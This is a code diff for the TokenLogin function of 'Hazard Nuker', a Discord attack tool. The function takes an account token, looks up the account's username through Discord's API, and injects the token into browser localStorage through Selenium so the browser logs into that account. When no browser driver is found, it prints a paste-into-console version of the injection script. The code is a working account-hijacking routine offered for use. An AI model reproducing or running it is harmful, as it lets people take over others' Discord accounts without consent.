@@ -2,44 +2,48 @@
 # Copyright (c) 2021 Rdimo#6969 | https://Cheataway.com
 # Hazard Nuker under the GNU General Public Liscense v2 (1991).
 
-import os
+import requests
 import Hazard
 
 from time import sleep
 from selenium import webdriver
-from colorama import Fore
+from colorama import Fore, Back
 
-from util.plugins.common import Chrome_Installer
+from util.plugins.common import get_driver, getheaders
 
 def TokenLogin(token):
-    print(f"{Fore.GREEN}Checking Chromedriver. . .")
-    sleep(0.5)
-    if os.path.exists(os.getcwd()+"\\chromedriver.exe"):
-        print("Chromedriver already exists, continuing. . .")
-        sleep(0.5)
-    else:
-        print(f"{Fore.RED}Chromedriver not found! Installing it for you")
-        try:
-            Chrome_Installer()
-        except Exception as e:
-            print(f"{Fore.RED}Failed to download driver. . .\nError: {e}")
-            print(f"If this keeps happening go to https://github.com/Rdimo/Hazard-Nuker#9-log-into-an-account and install the chromedriver manually")
-            sleep(5)
-            Hazard.main()
+    j = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)).json()
+    user = j["username"] + "#" + str(j["discriminator"])
+    script = """
+            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"%s"`
+            location.reload();
+        """ % (token)
+    type_ = get_driver()
 
-    try:
+    if type_ == "chromedriver.exe":
         opts = webdriver.ChromeOptions()
         opts.add_experimental_option('excludeSwitches', ['enable-logging'])
         opts.add_experimental_option("detach", True)
         driver = webdriver.Chrome(options=opts)
-        driver.get("https://discordapp.com/login")
-        driver.execute_script("""
-                document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"%s"`
-                location.reload();
-               """ % (token))
+    # elif type_ == "operadriver.exe":
+    #     opts = webdriver.opera.options.ChromeOptions()
+    #     opts.add_experimental_option('excludeSwitches', ['enable-logging'])
+    #     opts.add_experimental_option("detach", True)
+    #     driver = webdriver.Opera(options=opts)
+    elif type_ == "msedgedriver.exe":
+        opts = webdriver.EdgeOptions()
+        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
+        opts.add_experimental_option("detach", True)
+        driver = webdriver.Edge(options=opts)
+    else:
+        print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Coudln\'t find a driver to automate the proccess of login in to {user}')
+        sleep(3)
+        print(f"{Fore.YELLOW}Paste this script into the console of a browser:{Fore.RESET}\n\n{Back.RED}{script}\n{Back.RESET}")
+        print("Enter anything to continue. . . ", end="")
+        input()
         Hazard.main()
-    except Exception as e:
-        print(f"{Fore.RED}Sorry Hazard had trouble logging into the account")
-        print(f"Ignoring error: {e}")
-        sleep(5)
-        Hazard.main()
+
+    print(f"{Fore.GREEN}Logging into {Fore.BLUE}{user}")
+    driver.get("https://discordapp.com/login")
+    driver.execute_script(script)
+    Hazard.main()
